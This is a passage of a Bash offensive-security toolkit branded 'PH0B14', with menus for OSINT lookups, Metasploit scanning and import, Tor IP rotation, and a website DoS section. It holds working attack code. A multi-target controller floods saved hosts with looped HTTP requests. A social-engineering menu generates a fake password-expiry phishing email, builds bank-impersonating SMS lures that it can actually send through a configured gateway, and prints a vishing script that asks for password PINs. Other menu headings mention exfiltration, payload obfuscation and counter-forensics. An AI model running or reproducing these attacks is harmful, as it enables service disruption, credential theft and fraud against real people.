    echo -e "${BOLD}${CYAN}========= DNS LOOKUP ========="
    read -p "$(echo -e ${YELLOW}'Domain: '${NC})" D
    [ -z "$D" ] && { pause; return; }
    echo ""
    echo -e "${CYAN}--- A ---${NC}";      dig "$D" A +short 2>&1
    echo -e "${CYAN}--- MX ---${NC}";     dig "$D" MX +short 2>&1
    echo -e "${CYAN}--- TXT ---${NC}";    dig "$D" TXT +short 2>&1 | head -10
    echo -e "${CYAN}--- NS ---${NC}";     dig "$D" NS +short 2>&1
    echo -e "${CYAN}--- ANY ---${NC}";    dig "$D" ANY +short 2>&1 | head -20
    pause
}

osint_crtsh() {
    print_banner
    echo -e "${BOLD}${CYAN}========= CRT.SH SUBDOMAINS ========="
    read -p "$(echo -e ${YELLOW}'Domain: '${NC})" D
    [ -z "$D" ] && { pause; return; }
    osint_open_url "https://crt.sh/?q=%25.$D"
    echo -e "${DIM}    Also available as JSON:${NC}"
    echo -e "    curl -s 'https://crt.sh/?q=%25.$D&output=json' | python3 -m json.tool | head -40"
    pause
}

osint_status() {
    print_banner
    echo -e "${BOLD}${CYAN}========= OSINT TOOLS STATUS =========${NC}"
    echo ""

    local entries=(
        "sherlock|git|https://github.com/sherlock-project/sherlock|$HOME/sherlock"
        "maigret|pip|maigret|"
        "whois|apt|whois|"
        "dig|apt|bind9-dnsutils|"
        "theHarvester|apt|theharvester|"
        "recon-ng|apt|recon-ng|"
        "spiderfoot|apt|spiderfoot|"
        "amass|apt|amass|"
        "nuclei|apt|nuclei|"
        "subfinder|apt|subfinder|"
    )

    echo -e "  ${BOLD}%-15s %-8s %s${NC}" "TOOL" "STATUS" "ACTION"
    echo -e "  ${CYAN}---------------------------------------------${NC}"

    for e in "${entries[@]}"; do
        IFS='|' read -r bin meth pkg dir <<< "$e"
        if command -v "$bin" >/dev/null 2>&1 || [ -n "$dir" -a -d "$dir" ]; then
            printf "  ${GREEN}%-15s [ok]${NC}\n" "$bin"
        else
            printf "  ${DIM}%-15s [miss]${NC}\n" "$bin"
        fi
    done

    echo ""
    echo -e "  ${BOLD}${CYAN}Install on demand:${NC}"
    echo -e "   ${GREEN}[a]${NC}  Install all missing via apt (asks before each)"
    echo -e "   ${GREEN}[s]${NC}  Install Sherlock only"
    echo -e "   ${GREEN}[m]${NC}  Install Maigret only"
    echo -e "   ${RED}[0]${NC}  Back"
    echo ""
    read -p "$(echo -e ${BOLD}${YELLOW}'Choice: '${NC})" C

    case "$C" in
        a|A)
            local apt_list=()
            for e in "${entries[@]}"; do
                IFS='|' read -r bin meth pkg dir <<< "$e"
                [ "$meth" = "apt" ] && ! command -v "$bin" >/dev/null 2>&1 && apt_list+=("$pkg")
            done
            if [ ${#apt_list[@]} -eq 0 ]; then
                echo -e "${GREEN}[+] Nothing missing via apt.${NC}"
                pause; return
            fi
            echo ""
            echo -e "${YELLOW}    apt packages to install:${NC}"
            printf "      %s\n" "${apt_list[@]}"
            read -p "$(echo -e ${BOLD}${YELLOW}'Install all now? [y/N]: '${NC})" DO
            if [ "$DO" = "y" ] || [ "$DO" = "Y" ]; then
                sudo apt update >/dev/null 2>&1
                sudo apt install -y "${apt_list[@]}" 2>&1 | tail -10
                echo -e "${GREEN}[+] apt install finished${NC}"
            fi
            ;;
        s|S) osint_install_sherlock ;;
        m|M) osint_install_maigret ;;
        0) return ;;
    esac
    pause
}

osint_install_sherlock() {
    print_banner
    local dir="$HOME/sherlock"
    if [ -d "$dir" ]; then
        echo -e "${GREEN}[+] Sherlock already installed at $dir${NC}"
        pause; return
    fi
    echo -e "${CYAN}[*] Cloning https://github.com/sherlock-project/sherlock${NC}"
    git clone --depth 1 https://github.com/sherlock-project/sherlock "$dir" 2>&1 | tail -3
    if [ -d "$dir" ]; then
        ( cd "$dir" && python3 -m pip install --break-system-packages -r requirements.txt 2>&1 | tail -3 )
        echo -e "${GREEN}[+] Sherlock installed${NC}"
    else
        echo -e "${RED}[!] Clone failed.${NC}"
    fi
    pause
}

osint_install_maigret() {
    print_banner
    if command -v maigret >/dev/null 2>&1; then
        echo -e "${GREEN}[+] Maigret already installed${NC}"
        pause; return
    fi
    echo -e "${CYAN}[*] Installing maigret via pip${NC}"
    pip3 install --break-system-packages maigret 2>&1 | tail -5
    if command -v maigret >/dev/null 2>&1; then
        echo -e "${GREEN}[+] Maigret installed${NC}"
    else
        echo -e "${RED}[!] Install failed.${NC}"
    fi
    pause
}

live_attacks_ascii() {
    clear
    export LC_ALL="${LC_ALL:-en_US.UTF-8}"
    local COLS=$(tput cols 2>/dev/null); [ -z "$COLS" ] && COLS=150
    local art=(
"   ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄  ▄▄   ▄▄  ▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ "
"  ██╔=======═╗ ██╔=======╗ ██║  ██║ ██╔======╗ ██╔=======╗"
"  ██║        ██║ ██║       ██║ ██║  ██║ ██║      ╚═╝ ██║       ╚═╝"
"  ██████████╔╝ ███████╗  ║ ██║  ██║ ███████╗    ███████╗  "
"  ██╔=======╝  ██╔===╝   ║ ╚██╗██╔╝ ██╔=====╝   ██╔=====╝  "
"  ██║          ████████╗ ║  ╚███╔╝  █████████╗  █████████╗ "
"  ╚═╝          ╚=======╝ ╚═╝   ╚══╝   ╚=======═╝  ╚=======═╝ "
    )
    local line
    for line in "${art[@]}"; do
        local LEN=${#line}
        local PAD=$(( (COLS - LEN) / 2 ))
        [ $PAD -lt 0 ] && PAD=0
        printf "%*s" "$PAD" ""
        echo -e "${BOLD}${RED}${line}${NC}"
    done
    echo ""
    local label="LIVE ATTACKS"
    local PAD=$(( (COLS - ${#label}) / 2 ))
    printf "%*s" "$PAD" ""
    echo -e "${BOLD}${RED}${label}${NC}"
    echo ""
    sleep 1.2
}

ipchanger_ascii() {
    clear
    export LC_ALL="${LC_ALL:-en_US.UTF-8}"
    local COLS=$(tput cols 2>/dev/null); [ -z "$COLS" ] && COLS=150
    local art=(
"  ▄▄ ▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄  ▄▄   ▄▄  ▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄"
" ██║ ██╔══██╗ ██╔=======═╝ ██╔=====╝ ██║  ██║ ██╔======╗ ██╔=======╗"
" ██║ ██████╔╝ ██║          ██║       ██║  ██║ ███████╗  ███████╗  ║"
" ██║ ██╔===╝  ██║          ██║       ╚██╗██╔╝ ██╔=====╝  ██╔=====╝  "
" ██║ ██║      ╚█████████╗ ╚████████╗ ╚███╔╝  █████████╗ █████████╗ "
" ╚═╝ ╚═╝       ╚=======═╝  ╚=======╝  ╚══╝   ╚=======═╝ ╚=======═╝ "
    )
    local line
    for line in "${art[@]}"; do
        local LEN=${#line}
        local PAD=$(( (COLS - LEN) / 2 ))
        [ $PAD -lt 0 ] && PAD=0
        printf "%*s" "$PAD" ""
        echo -e "${BOLD}${MAGENTA}${line}${NC}"
    done
    echo ""
    local label="IP CHANGER"
    local PAD=$(( (COLS - ${#label}) / 2 ))
    printf "%*s" "$PAD" ""
    echo -e "${BOLD}${MAGENTA}${label}${NC}"
    echo ""
    sleep 1.2
}

wifi_main_entry() {
    main_menu
}

# ===============================================================
# PH0B14 v4 — centered banner + labeled menus
# ===============================================================

# ------- Centered banner with separators -------

# ------- Attack surface, labeled -------

# ------- Tunnel: 5/6 with labels -------
# ------- Social: sender + real send + labels -------
# ------- AppleBLE: labels + ad list -------
# ------- Multi-target: labels + pauses -------
# ===============================================================
# END v4
# ===============================================================

# ===============================================================
# CENTERED BANNER v5
# ===============================================================

# ===============================================================
# END CENTERED BANNER
# ===============================================================

# ===============================================================
# DOUBLE-CTRL+C HANDLER
#   one Ctrl+C  -> return to menu
#   two Ctrl+C  -> quit the tool
# ===============================================================
PHOBIA_INT_STAMP="/tmp/.phobia_last_int"
PHOBIA_INT_WINDOW=3      # seconds between presses to count as "quit"

PHOBIA_INTERRUPTED=0
trap phobia_interrupt INT

# keep the helper so other functions can bail out early
interrupted() { [ "$PHOBIA_INTERRUPTED" = "1" ] && { PHOBIA_INTERRUPTED=0; return 0; }; return 1; }

# ===============================================================
# END DOUBLE-CTRL+C
# ===============================================================

# ===============================================================
# CENTERED BANNER v6 — centers on the REAL terminal width
# ===============================================================

# Also center the attack surface and other menus for consistency
addon_center_line() {
    local text="$1" color="$2"
    local COLS
    COLS=$(stty size 2>/dev/null | awk '{print $2}')
    [ -z "$COLS" ] && COLS=$(tput cols 2>/dev/null)
    [ -z "$COLS" ] && COLS=${COLUMNS:-100}
    [ "$COLS" -lt 70 ] && COLS=70
    local pad=$(( (COLS - ${#text}) / 2 ))
    [ $pad -lt 0 ] && pad=0
    printf "%*s" "$pad" ""
    printf "%b%s${NC}\n" "$color" "$text"
}

# ===============================================================
# END CENTERED BANNER v6
# ===============================================================

# ===============================================================
# UNIFIED WIDTH LAYOUT v7
#   - banner and menus share width W=88
#   - both centered on the real terminal width
#   - diamond section headers, double-line separators
# ===============================================================

# get the real terminal width once
phobia_cols() {
    local c
    c=$(stty size 2>/dev/null | awk '{print $2}')
    [ -z "$c" ] && c=$(tput cols 2>/dev/null)
    [ -z "$c" ] && c=${COLUMNS:-100}
    [ -z "$c" ] && c=100
    [ "$c" -lt 90 ] && c=90
    echo "$c"
}

# centered line printer
phobia_center() {
    local text="$1" color="$2"
    local cols pad
    cols=$(phobia_cols)
    pad=$(( (cols - ${#text}) / 2 ))
    [ $pad -lt 0 ] && pad=0
    printf "%*s" "$pad" ""
    printf "%b%s${NC}\n" "$color" "$text"
}

# boxed menu helper: wraps body lines in a box of W chars
phobia_box_top()   { printf "%*s" "$1" ""; echo -e "${BOLD}${CYAN}╔$(printf '═%.0s' $(seq 1 $PHOBIA_W))╗${NC}"; }
phobia_box_bot()   { printf "%*s" "$1" ""; echo -e "${BOLD}${CYAN}╚$(printf '═%.0s' $(seq 1 $PHOBIA_W))╝${NC}"; }
phobia_box_div()   { printf "%*s" "$1" ""; echo -e "${BOLD}${CYAN}╠$(printf '═%.0s' $(seq 1 $PHOBIA_W))╣${NC}"; }
phobia_box_empty() { printf "%*s" "$1" ""; echo -e "${BOLD}${CYAN}║$(printf ' %.0s' $(seq 1 $PHOBIA_W))║${NC}"; }
phobia_box_row() {
    # $1=pad $2=text $3=color
    local pad="$1" text="$2" color="$3"
    local len=${#text}
    local p=$(( (PHOBIA_W - len) / 2 )); [ $p -lt 0 ] && p=0
    local r=$(( PHOBIA_W - len - p )); [ $r -lt 0 ] && r=0
    printf "%*s" "$pad" ""
    printf "${BOLD}${CYAN}║${NC}"
    printf "%*s" "$p" ""
    printf "%b%s${NC}" "$color" "$text"
    printf "%*s" "$r" ""
    printf "${BOLD}${CYAN}║${NC}\n"
}

# ------------------------------------------------------------------
# BANNER v7
# ------------------------------------------------------------------
# ------------------------------------------------------------------
# ATTACK SURFACE v7 — same width, boxed, centered
# ------------------------------------------------------------------
# ===============================================================
# END v7
# ===============================================================

# ==================================================================
# PH0B14 v8 — clean, all addons wired, colors, better layout
# ==================================================================


phobia_cols() {
    local c
    c=$(stty size 2>/dev/null | awk '{print $2}')
    [ -z "$c" ] && c=$(tput cols 2>/dev/null)
    [ -z "$c" ] && c=${COLUMNS:-100}
    [ -z "$c" ] && c=100
    [ "$c" -lt 90 ] && c=90
    echo "$c"
}

# ---------- Ctrl+C: single = menu, double = quit ----------
PHOBIA_INT_STAMP="/tmp/.phobia_last_int"
PHOBIA_INT_WINDOW=3
PHOBIA_INTERRUPTED=0

phobia_interrupt() {
    local now last
    now=$(date +%s); last=0
    [ -f "$PHOBIA_INT_STAMP" ] && last=$(cat "$PHOBIA_INT_STAMP" 2>/dev/null)
    if [ $(( now - last )) -le $PHOBIA_INT_WINDOW ]; then
        rm -f "$PHOBIA_INT_STAMP"
        echo ""
        echo -e "${RED}[!] Double Ctrl+C — quitting.${NC}"
        pkill -9 -f xterm 2>/dev/null
        pkill -9 -f hostapd 2>/dev/null
        pkill -9 -f dnsmasq 2>/dev/null
        pkill -9 -f "evil-server.py" 2>/dev/null
    pkill -9 -f https_probe.py 2>/dev/null
        pkill -9 -f aireplay-ng 2>/dev/null
        pkill -9 -f airodump-ng 2>/dev/null
        pkill -9 -f mdk4 2>/dev/null
        pkill -9 -f arpspoof 2>/dev/null
        pkill -9 -f reaver 2>/dev/null
        pkill -9 -f wash 2>/dev/null
        pkill -9 -f hcxdumptool 2>/dev/null
        sleep 1
        iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE 2>/dev/null
        iptables -D FORWARD -i wlan0 -o eth0 -j ACCEPT 2>/dev/null
        iptables -D FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null
        sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1
        if ip link show "$MONITOR" >/dev/null 2>&1; then ip link set "$MONITOR" down >/dev/null 2>&1; fi
        if iw dev "$MONITOR" info >/dev/null 2>&1; then iw dev "$MONITOR" del >/dev/null 2>&1; fi
        if ip link show "$INTERFACE" >/dev/null 2>&1; then
            ip link set "$INTERFACE" down >/dev/null 2>&1
            iw dev "$INTERFACE" set type managed >/dev/null 2>&1
            ip link set "$INTERFACE" up >/dev/null 2>&1
        fi
        timeout 5 dhclient "$INTERFACE" >/dev/null 2>&1 &
        timeout 10 systemctl restart NetworkManager >/dev/null 2>&1 &
        echo -e "${GREEN}[+] Cleaned up.${NC}"
        print_exit_banner
        exit 0
    fi
    echo "$now" > "$PHOBIA_INT_STAMP"
    echo ""
    echo -e "${YELLOW}[*] Ctrl+C — back to menu.${NC}"
    echo -e "${DIM}    (again within ${PHOBIA_INT_WINDOW}s = QUIT)${NC}"
    pkill -9 -f xterm 2>/dev/null
    pkill -9 -f aireplay-ng 2>/dev/null
    pkill -9 -f airodump-ng 2>/dev/null
    pkill -9 -f mdk4 2>/dev/null
    pkill -9 -f arpspoof 2>/dev/null
    pkill -9 -f hostapd 2>/dev/null
    pkill -9 -f "dnsmasq.*dnsm" 2>/dev/null
    sleep 1
    PHOBIA_INTERRUPTED=1
}
trap phobia_interrupt INT
interrupted() { [ "$PHOBIA_INTERRUPTED" = "1" ] && { PHOBIA_INTERRUPTED=0; return 0; }; return 1; }

# ---------- colors that got lost ----------
WHITE='\033[1;37m'

# ---------- banner (compact, colored, centered) ----------
# ---------- box helpers for menus ----------
# ---------- menu header helper ----------
# ==================================================================
# ATTACK SURFACE (main)
# ==================================================================
# ==================================================================
# MAIN MENU (wifi main) — stealth under 's'
# ==================================================================
# ==================================================================
# STEALTH MENU (with counter-forensics 6)
# ==================================================================
# ==================================================================
# WPA3 (advanced option 3)
# ==================================================================
# ==================================================================
# WIRELESS EXTENDED (cellular 4, physical 5)
# ==================================================================
# ==================================================================
# TUNNEL (5 exfil, 6 local http)
# ==================================================================
# ==================================================================
# OSINT (social 13)
# ==================================================================
# ==================================================================
# IP CHANGER (anonymity 5)
# ==================================================================
# ==================================================================
# MSF (post-enum 2, AI 3)
# ==================================================================
addon_msf_run() {
    lan_pick_target "MSF TARGET" || { addon_wait; return; }
    MSF_TARGET="$LAN_TARGET_IP"
    echo -e "${GREEN}[+] Target: $MSF_TARGET${NC}"
    command -v msfconsole >/dev/null 2>&1 || { echo -e "${RED}[!] msf missing${NC}"; addon_wait; return; }
    local out="/tmp/msf_$(date +%s).xml"
    echo -e "${CYAN}[*] nmap scan (max 120s)...${NC}"
    timeout 120 sudo nmap -Pn -sV -T4 -oX "$out" "$MSF_TARGET" 2>/dev/null | tail -15
    [ ! -f "$out" ] && { echo -e "${RED}[!] scan failed${NC}"; addon_wait; return; }
    echo -e "${CYAN}[*] importing to msf db (max 60s)...${NC}"
    timeout 60 msfconsole -q -x "db_import $out; services; exit" 2>&1 | tail -30
    echo -e "${GREEN}[+] done${NC}"
    addon_wait
}

# ==================================================================
# WEB SCAN (fuzz 6)
# ==================================================================
# ==================================================================
# BLUETOOTH (hardware 16)
# ==================================================================
# ==================================================================
# SOCIAL (sender + gateway + send)
# ==================================================================
# ==================================================================
# MULTI-TARGET (with clearer help and auto-prompt)
# ==================================================================
# ==================================================================
# APPLEBLE with hci list + BLE advertise list
# ==================================================================
addon_bt_hci_list() {
    echo -e "${CYAN}[*] Bluetooth adapters:${NC}"
    local found=0
    for x in /sys/class/bluetooth/hci*; do
        [ -e "$x" ] || continue
        local h; h=$(basename "$x")
        local a; a=$(hciconfig "$h" 2>/dev/null | awk '/BD Address/{print $3}')
        echo -e "  ${GREEN}$h${NC}  ${YELLOW}${a:-?}${NC}"
        found=1
    done
    [ $found -eq 0 ] && echo -e "  ${RED}none — plug in a BT adapter${NC}"
}
# ==================================================================
# END v8
# ==================================================================

# ===============================================================
# MISSING ADDON FUNCTIONS — restored
# These are called by existing menus. No menu changes here.
# ===============================================================

# --- MSF menu, option 2: local post-exploitation enum ---
# --- MSF menu, option 3: AI target scoring from nmap XML ---
# --- Wireless Extended, option 4: cellular / SDR ---
# --- Wireless Extended, option 5: physical access ---
# --- Tunnels, option 5: exfiltration ---
# --- Tunnels, extra: payload obfuscator (also exposed as option 7) ---
# ===============================================================
# END MISSING ADDON FUNCTIONS
# ===============================================================

# ===============================================================
# BOXED CENTERED MENUS — rebuild for 3,4,5,6,9,10,12,13
# Same visual style as menu_surface.
# ===============================================================

# ---------- 3. WEBSITE / DoS ----------
menu_web() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "W E B S I T E   /   D o S"
        phb_row "  ── WEB ──" "${BOLD}${VIOLET}"
        phb_row "  [1]  Scan & Exploit" "${BOLD}${CYAN}"
        phb_row "       recon, nikto, sqlmap, xss, nuclei, fuzz" "${DIM}${GREY}"
        phb_row "  [2]  Denial of Service" "${BOLD}${RED}"
        phb_row "       http flood, slowloris, syn, udp, multi" "${DIM}${GREY}"
        phb_div
        phb_row "  [0]  Back" "${RED}"
        menu_footer
        read -p "$(echo -e ${BOLD}${YELLOW}'Choice: '${NC})" WC
        case "$WC" in
            1) menu_web_scan ;;
            2) menu_web_dos ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

# ---------- 4. LOCAL NETWORK ----------
# ---------- 5. ACTIVE DIRECTORY ----------
# ---------- 6. INTERNAL SERVICES ----------
# ---------- 9. CLOUD / CONTAINERS ----------
# ---------- 10. LIVE ATTACKS ----------
# ---------- 12. TUNNEL SETUP ----------
# ---------- 13. CUSTOM PAGE LOADER ----------
# ===============================================================
# END BOXED CENTERED MENUS
# ===============================================================


# ===============================================================
# ENTRY POINT — must be last
# ===============================================================

# ===============================================================
# CENTERED BANNER + COLORED ATTACK SURFACE
# ===============================================================
# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# MENU HEADER — draws PHOBIA banner then the title box
# ===============================================================
# ===============================================================
# END MENU HEADER
# ===============================================================

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# ATTACK SURFACE — everything inside one box
# ===============================================================
# ===============================================================
# END ATTACK SURFACE
# ===============================================================

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# ATTACK SURFACE — boxed, colored, aligned
# ===============================================================
# ===============================================================
# END ATTACK SURFACE
# ===============================================================

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# ATTACK SURFACE — boxed, colored, aligned right border
# ===============================================================
# ===============================================================
# END ATTACK SURFACE
# ===============================================================

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# ATTACK SURFACE — rectangle, right border aligned
# ===============================================================
# ===============================================================
# END ATTACK SURFACE
# ===============================================================

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# ATTACK SURFACE — perfect rectangle
# ===============================================================
# ===============================================================
# END ATTACK SURFACE
# ===============================================================

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# SHARED BOX HELPERS — used by every submenu
# width matches menu_surface: PHOBIA_W = 86
# ===============================================================
PHOBIA_W=86

# visible char count of a string (strip ANSI, count UTF-8 chars)
_plen() {
    printf '%s' "$1" | sed $'s/\x1b\\[[0-9;]*m//g' | LC_ALL=C.UTF-8 wc -m | tr -d ' '
}

# left offset to center the box on the real terminal width
# top border
# bottom border
# separator (all dashes inside the box)
# blank row inside the box
# left-aligned row with padding to exactly PHOBIA_W + 1 visible columns inside
# centered row inside the box
# draw the PHOBIA banner, then the title box for a submenu
# close the box
# convenience alias used by existing code that calls `menu_row "text" "color"`
menu_row() {
    phb_row "$1" "$2"
}

# ===============================================================
# END SHARED BOX HELPERS
# ===============================================================

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# COLORED SUBMENUS — per-option colors matching attack surface
# ===============================================================

# ---- 1. WiFi main menu ----
# ---- 2. Bluetooth ----
# ---- 7. Wireless Extended ----
# ---- 8. Tunnels ----
# ---- 11. IP Changer ----
menu_ip_changer() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "I P   C H A N G E R   ( T O R )"
        phb_row "  -- TOR --" "${BOLD}${MAGENTA}"
        phb_row "  [1]  Start IP rotation"     "${BOLD}${MAGENTA}"
        phb_row "  [2]  Show current exit IP"  "${BOLD}${MAGENTA}"
        phb_row "  [3]  Tor status"            "${BOLD}${MAGENTA}"
        phb_row "  [4]  Restart Tor"           "${BOLD}${MAGENTA}"
        phb_row "  -- ANONYMITY --" "${BOLD}${SKY}"
        phb_row "  [5]  MAC / proxychains / DNS leak" "${BOLD}${SKY}"
        phb_div
        phb_row "  [0]  Back"                  "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
        case "$C" in
            1) ipchanger_start ;;
            2) echo ""; echo -e "  ${CYAN}Exit IP:${NC} $(ipchanger_current_ip)"; addon_wait ;;
            3) systemctl status tor --no-pager 2>&1 | head -10; addon_wait ;;
            4) sudo systemctl restart tor 2>&1 | tail -3; sleep 3; addon_wait ;;
            5) addon_anonymity ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

# ---- 15. OSINT ----
osint_menu() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "O S I N T   L O O K U P S"
        phb_row "  -- EMAIL --" "${BOLD}${LIME}"
        phb_row "  [1]  emailosint.org"       "${BOLD}${LIME}"
        phb_row "  [2]  haveibeenpwned"       "${BOLD}${LIME}"
        phb_row "  [3]  Hunter.io"            "${BOLD}${LIME}"
        phb_row "  -- USERNAME --" "${BOLD}${ORANGE}"
        phb_row "  [4]  whatsmyname.app"      "${BOLD}${ORANGE}"
        phb_row "  [5]  Sherlock (local)"     "${BOLD}${ORANGE}"
        phb_row "  [6]  Maigret (local)"      "${BOLD}${ORANGE}"
        phb_row "  -- PHONE --" "${BOLD}${SKY}"
        phb_row "  [7]  free carrier lookup"  "${BOLD}${SKY}"
        phb_row "  [8]  numlookup"            "${BOLD}${SKY}"
        phb_row "  -- DOMAIN --" "${BOLD}${VIOLET}"
        phb_row "  [9]  Google dork builder"  "${BOLD}${VIOLET}"
        phb_row "  [10] WHOIS"                "${BOLD}${VIOLET}"
        phb_row "  [11] DNS lookup"           "${BOLD}${VIOLET}"
        phb_row "  [12] crt.sh subdomains"    "${BOLD}${VIOLET}"
        phb_row "  -- HUMAN INTEL --" "${BOLD}${PINK}"
        phb_row "  [13] Social engineering"   "${BOLD}${PINK}"
        phb_row "  -- TOOL STATUS --" "${BOLD}${MAGENTA}"
        phb_row "  [20] Show installed tools" "${BOLD}${MAGENTA}"
        phb_row "  [21] Install Sherlock"     "${BOLD}${MAGENTA}"
        phb_row "  [22] Install Maigret"      "${BOLD}${MAGENTA}"
        phb_div
        phb_row "  [0]  Back"                 "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" O
        case "$O" in
            1) osint_email_osint_org ;;
            2) osint_hibp ;;
            3) osint_hunter ;;
            4) osint_whatsmyname ;;
            5) osint_sherlock ;;
            6) osint_maigret ;;
            7) osint_phone_carrier ;;
            8) osint_numlookup ;;
            9) osint_dork_builder ;;
            10) osint_whois ;;
            11) osint_dns ;;
            12) osint_crtsh ;;
            13) addon_social ;;
            20) osint_status ;;
            21) osint_install_sherlock ;;
            22) osint_install_maigret ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

# ---- 16. MSF ----
msf_scan_exploit() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "M E T A S P L O I T   /   P O S T - E X P L O I T"
        phb_row "  -- EXPLOIT --" "${BOLD}${RED}"
        phb_row "  [1]  Scan + exploit a target" "${BOLD}${RED}"
        phb_row "  -- POST --" "${BOLD}${MAGENTA}"
        phb_row "  [2]  Local post-exploitation enum" "${BOLD}${MAGENTA}"
        phb_row "  [3]  AI target scoring"           "${BOLD}${MAGENTA}"
        phb_div
        phb_row "  [0]  Back"                        "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
        case "$C" in
            1) addon_msf_run ;;
            2) addon_post_enum ;;
            3) addon_ai_layer ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

# ---- 17. Multi-target controller ----
addon_multi_controller() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "M U L T I - T A R G E T   C O N T R O L L E R"
        local tf="$BASE_DIR/targets.txt"; touch "$tf"
        local count; count=$(grep -c . "$tf" 2>/dev/null || echo 0)
        phb_row "  Saved targets: $count" "${DIM}${GREY}"
        phb_div
        phb_row "  -- ACTIONS --" "${BOLD}${MAGENTA}"
        phb_row "  [1]  Add target"     "${BOLD}${MAGENTA}"
        phb_row "  [2]  List targets"   "${BOLD}${MAGENTA}"
        phb_row "  [3]  Scan all"       "${BOLD}${MAGENTA}"
        phb_row "  [4]  HTTP flood all" "${BOLD}${MAGENTA}"
        phb_row "  [5]  Clear"          "${BOLD}${MAGENTA}"
        phb_div
        phb_row "  [0]  Back"           "${RED}"
        menu_footer
        read -p "Choice (ENTER = add new target): " C
        if [ -z "$C" ] && [ "$count" = "0" ]; then C=1; fi
        case "$C" in
            1) read -p "Target (IP/host): " T
               [ -z "$T" ] && { addon_wait; continue; }
               echo "$T" >> "$tf"; echo -e "${GREEN}[+] added${NC}"; addon_wait ;;
            2) echo -e "${CYAN}Targets:${NC}"; cat -n "$tf" 2>/dev/null; addon_wait ;;
            3) if [ ! -s "$tf" ]; then echo -e "${YELLOW}[!] no targets${NC}"; addon_wait; continue; fi
               while read -r t; do
                   [ -z "$t" ] && continue
                   echo -e "${CYAN}[*] $t${NC}"
                   timeout 60 nmap -Pn -T4 --top-ports 100 "$t" | grep -E '^[0-9]+/'
               done < "$tf"
               addon_wait ;;
            4) if [ ! -s "$tf" ]; then echo -e "${YELLOW}[!] no targets${NC}"; addon_wait; continue; fi
               read -p "Duration (sec) [30]: " D; D="${D:-30}"
               while read -r t; do
                   [ -z "$t" ] && continue
                   ( end=$(( $(date +%s) + D ))
                     while [ "$(date +%s)" -lt "$end" ]; do
                         curl -s -o /dev/null --max-time 5 "http://$t/" 2>/dev/null
                     done ) &
               done < "$tf"
               wait; echo -e "${GREEN}[+] done${NC}"; addon_wait ;;
            5) > "$tf"; echo -e "${GREEN}[+] cleared${NC}"; addon_wait ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

# ===============================================================
# END COLORED SUBMENUS
# ===============================================================

# ===============================================================
# ENTRY POINT
# ===============================================================

# ===============================================================
# COLORED SUB-SUBMENUS — every menu uses per-row colors
# ===============================================================

# ---- SOCIAL (from OSINT 13) ----
addon_social() {
    trap on_interrupt INT
    while true; do
        print_banner
        menu_header "S O C I A L   E N G I N E E R I N G"
        phb_row "  -- PHISHING --" "${BOLD}${PINK}"
        phb_row "  [1]  Pretext email"     "${BOLD}${PINK}"
        phb_row "  [2]  SMS phishing"      "${BOLD}${PINK}"
        phb_row "  [3]  Vishing script"    "${BOLD}${PINK}"
        phb_row "  [4]  QR phishing"       "${BOLD}${PINK}"
        phb_row "  -- CONFIG --" "${BOLD}${MAGENTA}"
        phb_row "  [5]  Configure SMS gateway" "${BOLD}${MAGENTA}"
        phb_div
        phb_row "  [0]  Back"              "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
        case "$C" in
            1) read -p "Company: " CO
               read -p "Pretext [IT support]: " PT; PT="${PT:-IT support}"
               read -p "Sender name [Admin]: " SN; SN="${SN:-Admin}"
               cat <<EOF

From: $SN
Subject: Urgent: Password Expiration Notice
Dear $CO employee,
Your network password will expire in 24 hours.
Click here to reset: http://10.0.0.1/reset
Regards, $SN

EOF
               addon_wait ;;
            2) read -p "Phone (E.164): " PH
               read -p "Sender [Bank]: " SN; SN="${SN:-Bank}"
               read -p "Message [Your account has been locked. Verify: http://10.0.0.1/verify]: " MSG
               MSG="${MSG:-Your account has been locked. Verify: http://10.0.0.1/verify}"
               echo ""
               echo -e "${BOLD}SMS to $PH:${NC}"
               echo -e "[$SN] $MSG"
               echo ""
               if [ -n "$SMS_API_URL" ] && [ -n "$SMS_API_KEY" ]; then
                   read -p "Send for real now? [y/N]: " S
                   if [ "$S" = "y" ] || [ "$S" = "Y" ]; then
                       curl -s -X POST "$SMS_API_URL" \
                           -H "Authorization: Bearer $SMS_API_KEY" \
                           -H "Content-Type: application/x-www-form-urlencoded" \
                           --data-urlencode "to=$PH" \
                           --data-urlencode "from=$SN" \
                           --data-urlencode "text=[$SN] $MSG" | head -5
                       echo -e "${GREEN}[+] request sent${NC}"
                   fi
               else
                   echo -e "${DIM}    No gateway set. Option 5 to configure.${NC}"
               fi
               addon_wait ;;
            3) cat <<'VS'

"Hi, this is [name] from IT. We detected unusual login attempts
on your account. I need to verify your identity. Can you confirm
your username and the last 4 digits of your password reset PIN?"

VS
